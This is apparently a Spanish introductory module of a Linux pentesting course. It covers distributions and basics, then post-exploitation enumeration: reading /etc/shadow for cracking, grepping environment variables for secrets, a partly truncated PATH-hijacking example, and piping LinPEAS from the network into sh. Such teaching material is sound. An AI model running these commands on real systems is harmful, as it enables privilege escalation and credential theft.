---
title: "Módulo Introducción - Curso Linux Pentesting"
aliases:
  - Módulo Introducción - Curso Linux Pentesting
tags:
  - ifct0109/pocs
  - linux
  - introduccion
  - kernel
---

# Curso de Linux para Pentesting

Módulo Introducción a Linux

  [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|← Volver al Índice del Curso]]

## 🐧 ¿Qué es Linux?

Linux es un **sistema operativo de código abierto** basado en Unix, creado en 1991 por **Linus Torvalds**. A diferencia de Windows o macOS, Linux es:

* ✅ Gratuito y de código abierto - Puedes ver, modificar y distribuir su código

* ✅ Multiusuario - Varios usuarios pueden trabajar simultáneamente

* ✅ Multitarea - Ejecuta múltiples procesos a la vez eficientemente

* ✅ Seguro y estable - Sistema de permisos robusto, menos vulnerable a virus

* ✅ Flexible y personalizable - Control total sobre el sistema

* ✅ Potente línea de comandos - Automatización y control preciso

> [!warning] 🎯 ¿Por qué Linux para Pentesting?
>        Linux es el sistema operativo preferido por profesionales de ciberseguridad porque:
>
>          🔧  Herramientas nativas  - La mayoría de herramientas de hacking están diseñadas para Linux
>          🎛️  Control total del sistema  - Acceso completo a nivel de kernel
>          📦  Fácil instalación de herramientas  - Repositorios especializados (Kali, Parrot)
>          🔒  Privacidad y anonimato  - Sin telemetría ni backdoors corporativas
>          💻  Eficiencia de recursos  - Funciona en hardware antiguo o limitado
>          🌐  Networking avanzado  - Control total de interfaces de red

## 📜 Breve Historia de Linux

#### 1969 - Unix

Bell Labs crea Unix, el sistema que inspiraría a Linux. Unix se convierte en el estándar para sistemas operativos robustos.

#### 1983 - Proyecto GNU

Richard Stallman inicia el proyecto GNU (GNU's Not Unix) para crear un sistema operativo completamente libre. Desarrolla herramientas esenciales pero falta el núcleo (kernel).

#### 1991 - Nace Linux

Linus Torvalds, estudiante finlandés de 21 años, crea el kernel Linux como proyecto personal. Lo libera bajo licencia GPL.

#### 1993 - Primera Distribución Seria

Slackware y Debian se convierten en las primeras distribuciones estables. GNU/Linux empieza a ser viable para uso real.

#### 2000s - Explosión de Distros

Surgen Ubuntu (2004), Fedora, CentOS. Linux se populariza en servidores web y empresas.

#### 2013 - Kali Linux

Offensive Security lanza Kali Linux (sucesor de BackTrack), la distribución definitiva para pentesting con más de 600 herramientas preinstaladas.

#### Actualidad

Linux domina servidores (~96% de los top 1M sitios web), supercomputadoras (100%), Android (sistema móvil más usado), IoT, y es esencial en ciberseguridad.

## 🎨 Distribuciones de Linux

Una **distribución (distro)** es Linux empaquetado con software adicional, herramientas y configuraciones específicas. Hay cientos de distribuciones, cada una para necesidades diferentes.

### 🔐 Distribuciones para Pentesting

#### 🐉 Kali Linux

**La #1 para pentesting**

* Basada en Debian

* 600+ herramientas preinstaladas

* Mantenida por Offensive Security

* Rolling release (siempre actualizada)

* Ideal para auditorías, CTFs, red teams

**Herramientas destacadas:** Metasploit, Nmap, Burp Suite, Wireshark, John, Hydra, SQLmap, Aircrack-ng

#### 🦜 Parrot Security OS

**Alternativa ligera a Kali**

* Basada en Debian

* Consume menos recursos que Kali

* Enfocada en privacidad y anonimato

* Herramientas de pentesting + forense

* Interfaz más amigable para principiantes

**Ventaja:** Funciona bien en hardware antiguo o VMs con pocos recursos

#### ⚫ BlackArch Linux

**La más completa**

* Basada en Arch Linux

* 2800+ herramientas de seguridad

* Rolling release bleeding edge

* Para usuarios avanzados

* Repositorio independiente de herramientas

**Nota:** Curva de aprendizaje alta, requiere conocimiento de Arch

### 💼 Distribuciones de Uso General

#### 🌀 Debian

**La base de todo, estable y confiable**

* Una de las distribuciones más antiguas (1993)

* Base de Ubuntu, Kali, Parrot y cientos más

* Extremadamente estable y segura

* Perfecta para servidores y producción

* Tres ramas: Stable, Testing, Unstable

**Nota:** Si aprendes Debian, entiendes la mayoría de distros Linux

#### 🟠 Ubuntu

**La más popular y amigable**

* Basada en Debian

* Fácil de usar para principiantes

* Enorme comunidad y documentación

* Versiones LTS (soporte 5 años)

* Puedes instalar herramientas manualmente

**Ideal para:** Aprender Linux antes de saltar a Kali

#### 🔴 Fedora

**Innovación y tecnología reciente**

* Patrocinada por Red Hat

* Tecnologías de vanguardia

* Muy segura por defecto (SELinux)

* Base para RHEL (empresarial)

* Actualizaciones frecuentes

#### 🍃 Linux Mint

**La más amigable para nuevos usuarios**

* Basada en Ubuntu/Debian

* Interfaz Cinnamon muy intuitiva

* Ideal para transición desde Windows

* Multimedia funcionando desde instalación

* Menos recursos que Ubuntu

**Ideal para:** Primera experiencia con Linux, uso de escritorio diario

#### 🎮 Bazzite

**Gaming en Linux llevado al extremo**

* Basada en Fedora Atomic (inmutable)

* Optimizada específicamente para gaming

* Steam, Lutris, Proton preconfigurados

* Soporte nativo para Steam Deck y handhelds

* Drivers GPU y herramientas gaming incluidas

**Ideal para:** Gamers que quieren la mejor experiencia de juego en Linux

#### 🚀 CachyOS

**Rendimiento extremo y optimización**

* Basada en Arch Linux

* Kernel optimizado para máximo rendimiento

* Compilaciones con optimizaciones avanzadas

* Repositorios propios más rápidos

* Varias versiones de kernel (bore, cachyos, linux-zen)

**Ideal para:** Hardware moderno que busca exprimir al máximo el rendimiento

> [!warning] 💡 ¿Cuál elegir?
>
>          🎯  Principiante absoluto en Linux  → Linux Mint (más amigable que Ubuntu)
>          🎯  Principiante técnico  → Ubuntu (gran comunidad y documentación)
>          🎯  Quiero estabilidad máxima  → Debian Stable
>          🎯  Quiero empezar pentesting YA  → Kali Linux
>          🎯  Hardware limitado  → Parrot Security OS o Linux Mint XFCE
>          🎯  Quiero aprender Linux a fondo  → Arch Linux + herramientas manuales
>          🎯  Todas las herramientas posibles  → BlackArch
>          🎯  Servidor en producción  → Debian Stable o Ubuntu LTS

## 🏗️ Arquitectura Básica de Linux

```bash
┌─────────────────────────────────────────┐
│        APLICACIONES DE USUARIO          │
│   (Firefox, Terminal, Metasploit)       │
├─────────────────────────────────────────┤
│            SHELL (bash, zsh)            │
│     Interfaz entre usuario y sistema    │
├─────────────────────────────────────────┤
│     UTILIDADES GNU (coreutils)          │
│   (ls, grep, cat, chmod, cp, mv...)     │
├─────────────────────────────────────────┤
│          LIBRERÍAS DEL SISTEMA          │
│       (glibc, OpenSSL, GTK, Qt)         │
├─────────────────────────────────────────┤
│         KERNEL LINUX (núcleo)           │
│  Gestiona hardware, memoria, procesos   │
├─────────────────────────────────────────┤
│            HARDWARE                     │
│   (CPU, RAM, Disco, Red, GPU...)        │
└─────────────────────────────────────────┘
```

### 🔑 Componentes Clave

#### 1. Kernel (Núcleo)

El corazón del sistema operativo. Gestiona:

* Procesos y multitarea

* Memoria RAM

* Drivers de hardware

* Sistema de archivos

* Comunicación entre aplicaciones y hardware

# Ver versión del kernel:
tecnico@linux:~$ uname -r
6.8.0-kali1-amd64

# Información completa del sistema:
tecnico@linux:~$ uname -a
Linux kali 6.8.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.8.11-1kali2 x86_64 GNU/Linux

#### 2. Shell (Intérprete de Comandos)

Interfaz entre el usuario y el kernel. Los más comunes:

* Bash (Bourne Again Shell) - El estándar, usado en el 90% de distros

* Zsh (Z Shell) - Bash mejorado con autocompletado inteligente

* Fish - Muy amigable para principiantes

* Sh - Shell POSIX básico, compatible universalmente

# Ver qué shell estás usando:
tecnico@linux:~$ echo $SHELL
/bin/bash

# Ver todos los shells disponibles:
tecnico@linux:~$ cat /etc/shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/usr/bin/sh
/bin/dash
/usr/bin/dash
/usr/bin/zsh

#### 3. Sistema de Archivos

Todo en Linux es un archivo (incluidos dispositivos y procesos). La estructura estándar:

/                    Raíz del sistema
├── bin/             Binarios esenciales del sistema (ls, cat, cp)
├── boot/            Archivos de arranque (kernel, GRUB)
├── dev/             Dispositivos (discos, USB, terminales)
├── etc/             Archivos de configuración del sistema
├── home/            Directorios personales de usuarios
│   └── tecnico/     Tu directorio personal
├── lib/             Librerías compartidas del sistema
├── media/           Puntos de montaje para USB, CDs
├── mnt/             Montajes temporales
├── opt/             Software adicional
├── proc/            Información de procesos (virtual)
├── root/            Directorio personal del superusuario
├── sbin/            Binarios de administración del sistema
├── srv/             Datos de servicios (web, FTP)
├── sys/             Información del sistema (virtual)
├── tmp/             Archivos temporales
├── usr/             Programas y librerías de usuario
│   ├── bin/         Binarios de usuario
│   ├── lib/         Librerías adicionales
│   └── local/       Software instalado localmente
└── var/             Datos variables (logs, cache, correo)

## 🖥️ Interfaces: GUI vs CLI

### GUI (Graphical User Interface) - Interfaz Gráfica

Linux ofrece varios entornos de escritorio:

* GNOME - Moderno y minimalista (Ubuntu por defecto)

* KDE Plasma - Muy personalizable, similar a Windows

* XFCE - Ligero y rápido (Kali por defecto)

* Cinnamon - Elegante, basado en GNOME (Linux Mint)

* i3/Openbox - Minimalistas, basados en teclado

**Ventaja:** Intuitivo, fácil para principiantes

**Desventaja:** Consume más recursos, menos eficiente para tareas automatizadas

### CLI (Command Line Interface) - Línea de Comandos

Terminal/consola donde escribes comandos de texto.

**Ventajas:**

* ⚡ Velocidad - Realizar tareas complejas en segundos

* 🔄 Automatización - Scripts para tareas repetitivas

* 🎯 Precisión - Control exacto sobre cada acción

* 📡 Acceso remoto - SSH para controlar máquinas a distancia

* 💾 Eficiencia - Consume mínimos recursos

* 🔧 Potencia - Acceso a funciones que la GUI no expone

**En pentesting, la CLI es ESENCIAL:**

* La mayoría de herramientas son de línea de comandos

* Servidores no tienen interfaz gráfica

* Shells remotas solo dan acceso a terminal

* Scripts de automatización y exploits se ejecutan en CLI

> [!warning] 🎯 Objetivo de Este Curso
>        Aunque Linux tiene interfaces gráficas, este curso se enfoca en la  línea de comandos  porque:
>
>          Es donde reside el verdadero poder de Linux
>          Es imprescindible para pentesting
>          Una vez dominas la CLI, la GUI es trivial
>          Te permite trabajar en cualquier entorno (servidores, embedded, IoT)

## 🎓 Conceptos Fundamentales

#### Usuario Root (Superusuario)

El administrador del sistema con permisos totales.

* Puede hacer cualquier cosa en el sistema

* UID (User ID) = 0

* Su directorio personal es `/root` (no `/home/root`)

* Peligro: Un error como root puede destruir el sistema

# Símbolo del prompt indica el tipo de usuario:
tecnico@linux:~$ # Usuario normal ($ al final)
root@linux:~# # Usuario root (# al final)

# Ver tu usuario actual:
tecnico@linux:~$ whoami
tecnico

# Ver tu UID:
tecnico@linux:~$ id -u
1000

# Como root:
root@linux:~# whoami
root
root@linux:~# id -u
0

#### sudo (Super User DO)

Ejecuta un comando con privilegios de root sin convertirte en root.

# Leer un archivo protegido (sin sudo - falla):
tecnico@linux:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied

# Con sudo - funciona:
tecnico@linux:~$ sudo cat /etc/shadow
[sudo] password for tecnico: ****
root:$6$xyz123...:19752:0:99999:7:::
daemon:*:19752:0:99999:7:::
...

# Convertirse temporalmente en root:
tecnico@linux:~$ sudo -i
root@linux:~# # Ahora eres root
root@linux:~# exit
tecnico@linux:~$ # Vuelves a ser usuario normal

> [!warning] ⚠️ Buenas Prácticas con sudo
>
>            Usa `sudo` solo cuando sea necesario
>            NUNCA hagas `sudo rm -rf /` u operaciones destructivas sin revisar
>            Prefiere `sudo comando` a convertirte en root permanentemente
>            En Kali Linux puedes trabajar como root, pero es mala práctica en producción

#### Case Sensitivity (Sensible a Mayúsculas)

Linux distingue entre mayúsculas y minúsculas en TODO:

# Estos son tres archivos DIFERENTES:
tecnico@linux:~$ touch archivo.txt Archivo.txt ARCHIVO.txt
tecnico@linux:~$ ls
archivo.txt  Archivo.txt  ARCHIVO.txt

# Los comandos también son case-sensitive:
tecnico@linux:~$ ls
archivo.txt
tecnico@linux:~$ LS
bash: LS: command not found

#### Rutas Absolutas vs Relativas

# Ruta ABSOLUTA - desde la raíz (/):
tecnico@linux:~$ ls /home/tecnico/Documentos
# Funciona desde cualquier lugar del sistema

# Ruta RELATIVA - desde donde estás:
tecnico@linux:~$ pwd
/home/tecnico
tecnico@linux:~$ ls Documentos
# Solo funciona si estás en /home/tecnico

# Símbolos especiales:
#   .   = directorio actual
#   ..  = directorio padre
#   ~   = tu directorio home (/home/tecnico)
#   /   = raíz del sistema

tecnico@linux:~$ cd ..
tecnico@linux:/home$ pwd
/home

tecnico@linux:/home$ cd ~
tecnico@linux:~$ pwd
/home/tecnico

## ⚔️ Aplicaciones en Pentesting y Hacking Ético

A continuación encontrarás técnicas de reconocimiento del sistema, enumeración básica y fingerprinting que son fundamentales en la fase de post-explotación.

💡 Haz clic en cada sección para expandir el contenido

## 🎯 Técnicas de Pentesting - Reconocimiento del Sistema

      🔍 Reconocimiento Básico del Sistema (Post-Explotación)

#### Escenario: Has comprometido un sistema Linux

Tras obtener acceso inicial (reverse shell, credenciales comprometidas), el primer paso es **enumerar el sistema** para entender dónde estás y planificar la escalada de privilegios.

#### 🎯 Información del Sistema Operativo

# ¿Qué distribución es?
usuario@target:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"

# Versión del kernel (importante para exploits):
usuario@target:~$ uname -a
Linux target 5.4.0-150-generic #167-Ubuntu SMP x86_64 GNU/Linux

# Información de arquitectura:
usuario@target:~$ uname -m
x86_64

# Hostname del sistema:
usuario@target:~$ hostname
target.empresa.com

# Tiempo de actividad (uptime):
usuario@target:~$ uptime
14:23:01 up 45 days,  3:12,  2 users,  load average: 0.52, 0.48, 0.51
# Sistema con 45 días sin reiniciar = posiblemente sin parches

#### 👤 Información del Usuario Actual

# ¿Quién soy?
usuario@target:~$ whoami
www-data

# ¿Qué privilegios tengo?
usuario@target:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# ¿Puedo usar sudo?
usuario@target:~$ sudo -l
[sudo] password for www-data:
Sorry, user www-data may not run sudo on target.

# ¿Quién más ha iniciado sesión?
usuario@target:~$ w
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
admin    pts/0    10.10.10.5       14:05    0.00s  0.12s  0.01s w
root     pts/1    192.168.1.100    13:45    15:00  0.05s  0.05s -bash
# ¡Hay un admin conectado!

#### 💾 Recursos del Sistema

# Memoria RAM disponible:
usuario@target:~$ free -h
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       2.1Gi       0.5Gi       156Mi       1.2Gi       1.3Gi
Swap:         2.0Gi       512Mi       1.5Gi

# Espacio en disco:
usuario@target:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   42G  5.2G  90% /
/dev/sdb1       100G   85G   15G  86% /var/backups
# /var/backups tiene 15GB = puede tener backups interesantes

# CPUs disponibles:
usuario@target:~$ lscpu | grep "^CPU(s)"
CPU(s):                  4

#### 🎯 ¿Por qué es Importante?

* 📌 Kernel antiguo → Buscar exploits públicos (searchsploit, exploit-db)

* 📌 Usuario con bajos privilegios → Necesitas escalar privilegios

* 📌 Sistema sin reiniciar en meses → Sin parches de seguridad aplicados

* 📌 Otros usuarios conectados → Posible hijacking de sesiones

      👥 Enumeración de Usuarios y Grupos

#### Vector de Ataque: Descubrir Usuarios

Conocer qué usuarios existen, sus privilegios y configuraciones ayuda a planificar la escalada de privilegios o movimiento lateral.

#### 📋 Listar Usuarios del Sistema

# Ver todos los usuarios (humanos y del sistema):
usuario@target:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
tecnico:x:1001:1001:Tecnico:/home/tecnico:/bin/bash
mysql:x:108:113:MySQL Server:/var/lib/mysql:/bin/false

# Extraer solo usuarios humanos (UID >= 1000):
usuario@target:~$ awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd
admin
tecnico

# Ver usuarios con shell válida (pueden iniciar sesión):
usuario@target:~$ grep -E '/bin/(bash|sh|zsh)' /etc/passwd
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
tecnico:x:1001:1001:Tecnico:/home/tecnico:/bin/bash

#### 🔐 Intentar Leer /etc/shadow (Hashes de Contraseñas)

# Normalmente solo root puede leerlo:
usuario@target:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied

# Pero si hay una mala configuración...
usuario@target:~$ ls -l /etc/shadow
-rw-r--r-- 1 root shadow 1234 Feb 6 10:00 /etc/shadow
# ¡Readable por todos! Podemos crackear contraseñas

usuario@target:~$ cat /etc/shadow
root:$6$xyz123...:19752:0:99999:7:::
admin:$6$abc456...:19850:0:99999:7:::
tecnico:$6$def789...:19851:0:99999:7:::
# Copiar estos hashes y usar John the Ripper o Hashcat

#### 👥 Grupos y Membresías

# Ver todos los grupos:
usuario@target:~$ cat /etc/group | head -10
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,admin
sudo:x:27:admin,tecnico
docker:x:999:admin

# ¿A qué grupos pertenezco?
usuario@target:~$ groups
www-data

# Grupos de otro usuario:
usuario@target:~$ groups admin
admin : admin sudo docker adm
# ¡admin está en el grupo docker! → Vector de escalada

#### 🎯 Grupos Peligrosos para Escalada de Privilegios

| Grupo | Riesgo | Explotación |
| --- | --- | --- |
| `sudo` | 🔴 Crítico | Puede ejecutar comandos como root |
| `docker` | 🔴 Crítico | Crear contenedor con root en el host |
| `lxd` | 🔴 Crítico | Similar a docker, contenedores privilegiados |
| `disk` | 🔴 Crítico | Acceso directo a discos (leer /etc/shadow) |
| `adm` | 🟠 Alto | Leer logs del sistema (/var/log) |
| `shadow` | 🟠 Alto | Leer /etc/shadow |

      ⚙️ Enumeración de Procesos y Servicios

#### Vector de Ataque: Procesos en Ejecución

Los procesos activos revelan servicios, aplicaciones vulnerables y posibles vectores de escalada.

#### 🔍 Listar Procesos Activos

# Ver todos los procesos:
usuario@target:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 169564 11740 ?        Ss   10:00   0:01 /sbin/init
root       456  0.0  0.2  72296  6012 ?        Ss   10:00   0:00 /usr/sbin/sshd
mysql      789  0.5  5.2 1234567 123456 ?      Ssl  10:01   2:34 /usr/sbin/mysqld
root      1234  0.0  0.1  12345  3456 ?        S    14:00   0:00 /bin/sh /opt/backup.sh

# Procesos ejecutados por root (posibles escaladas):
usuario@target:~$ ps aux | grep ^root
root      1234  0.0  0.1  12345  3456 ?  S  14:00  0:00 /bin/sh /opt/backup.sh
# ¿Es /opt/backup.sh modificable? → Escalada de privilegios

# Procesos escuchando en red:
usuario@target:~$ netstat -tulnp
Proto Recv-Q Send-Q Local Address   Foreign Address   State       PID/Program name
tcp        0      0 0.0.0.0:22      0.0.0.0:*         LISTEN      456/sshd
tcp        0      0 127.0.0.1:3306  0.0.0.0:*         LISTEN      789/mysqld
tcp        0      0 0.0.0.0:80      0.0.0.0:*         LISTEN      890/apache2
# MySQL escuchando solo en localhost (127.0.0.1)

#### 🔧 Servicios del Sistema

# Listar servicios activos (systemd):
usuario@target:~$ systemctl list-units --type=service --state=running
UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
ssh.service              loaded active running OpenBSD Secure Shell server
mysql.service            loaded active running MySQL Community Server
apache2.service          loaded active running The Apache HTTP Server
cron.service             loaded active running Regular background program

# Ver configuración de un servicio:
usuario@target:~$ systemctl status apache2
● apache2.service - The Apache HTTP Server
   Loaded: loaded (/lib/systemd/system/apache2.service)
   Active: active (running) since Mon 2025-02-03 10:00:00
   Main PID: 890 (apache2)

# Servicios habilitados al inicio:
usuario@target:~$ systemctl list-unit-files --state=enabled

#### 📊 Conexiones de Red Activas

# Ver conexiones establecidas:
usuario@target:~$ ss -tuln
State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port
LISTEN   0        128      0.0.0.0:22            0.0.0.0:*
LISTEN   0        80       127.0.0.1:3306        0.0.0.0:*
ESTAB    0        0        192.168.1.100:22      10.10.10.5:54321
# Conexión SSH activa desde 10.10.10.5

# Ver conexiones con nombres de programas (requiere privilegios):
usuario@target:~$ sudo ss -tulnp

      🌍 Variables de Entorno y PATH

#### Vector de Ataque: Variables de Entorno

Las variables de entorno pueden revelar información sensible (credenciales, rutas) y son explotables para PATH hijacking.

#### 🔍 Enumerar Variables de Entorno

# Ver todas las variables:
usuario@target:~$ env
USER=www-data
HOME=/var/www
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SHELL=/bin/bash
PWD=/var/www/html
LANG=en_US.UTF-8
DB_PASSWORD=SuperSecret123!
# ¡Contraseña de base de datos en variable de entorno!

# Ver una variable específica:
usuario@target:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Variables interesantes para buscar:
usuario@target:~$ env | grep -i pass
DB_PASSWORD=SuperSecret123!
MYSQL_PWD=OtraPass456

usuario@target:~$ env | grep -i key
API_KEY=abcd1234efgh5678
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE

#### ⚡ Explotación: PATH Hijacking

# Si un script ejecutado por root usa comandos sin ruta absoluta:
usuario@target:~$ cat /opt/backup.sh
#!/bin/bash
tar -czf /backup/data.tar.gz /var/www/html
# Usa "tar" sin ruta completa (/bin/tar)

# Y si el PATH tiene un directorio escribible primero:
usuario@target:~$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
# ¡/tmp está PRIMERO en PATH!

# Crear un "tar" malicioso:
usuario@target:~$ cat > /tmp/tar usuario@target:~$ chmod +x /tmp/tar

# Cuando root ejecute backup.sh, usará NUESTRO tar:
# → Shell de root

#### 🎯 Variables Críticas para Revisar

* `PATH` - Directorios donde se buscan comandos

* `LD_PRELOAD` / `LD_LIBRARY_PATH` - Carga de librerías (explotable)

* `HOME` - Directorio personal del usuario

* `USER` / `LOGNAME` - Usuario actual

* Variables con PASS, KEY, TOKEN, SECRET - Credenciales

      🤖 Scripts de Enumeración Automatizada

#### Automatización del Reconocimiento

Scripts que automatizan la enumeración del sistema para encontrar vectores de escalada de privilegios.

#### 🔧 Herramientas de Enumeración Populares

#### LinPEAS (Linux Privilege Escalation Awesome Script)

El más completo y actualizado. Busca todo: SUID, capabilities, cron jobs, servicios, etc.

# Descargar y ejecutar (en máquina comprometida):
usuario@target:~$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
usuario@target:~$ chmod +x linpeas.sh
usuario@target:~$ ./linpeas.sh

# O ejecutar directamente desde memoria (sin dejar rastro en disco):
usuario@target:~$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Guardar output para análisis:
usuario@target:~$ ./linpeas.sh | tee linpeas_output.txt

#### LinEnum

Script bash simple y efectivo para enumeración básica.

usuario@target:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
usuario@target:~$ chmod +x LinEnum.sh
usuario@target:~$ ./LinEnum.sh -t -r enum_report.txt
# -t = thorough (exhaustivo), -r = export report

#### Linux Smart Enumeration (lse.sh)

Enumeración con niveles de detalle configurables.

usuario@target:~$ wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
usuario@target:~$ chmod +x lse.sh

# Nivel 0 - Rápido (solo lo más importante):
usuario@target:~$ ./lse.sh -l 0

# Nivel 1 - Interesante (recomendado):
usuario@target:~$ ./lse.sh -l 1

# Nivel 2 - Todo:
usuario@target:~$ ./lse.sh -l 2

#### 📋 Qué Buscan Estos Scripts

* ✅ Binarios SUID/SGID explotables

* ✅ Capabilities peligrosas

* ✅ Cron jobs manipulables

* ✅ Archivos escribibles en PATH

* ✅ Configuraciones de sudo

* ✅ Servicios vulnerables

* ✅ Kernel exploits conocidos

* ✅ Archivos de configuración con credenciales

* ✅ Historiales de bash con comandos sensibles

* ✅ Conexiones de red sospechosas

> [!warning] ⚠️ Importante
>            Estos scripts generan MUCHO output. Revisa cuidadosamente las secciones marcadas en  ROJO  o  AMARILLO  - son los hallazgos más críticos.

  [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|← Volver al Índice del Curso]]

Módulo Introducción a Linux - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v1.0

---

## 🔗 Navegación
* 🐧 [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|Volver al Portal del Curso de Linux]]
* 🗂️ [[02 - MODULOS/Prácticas (PoCs)/Linux/00 - Índice del Módulo Linux|Índice General de Linux]]
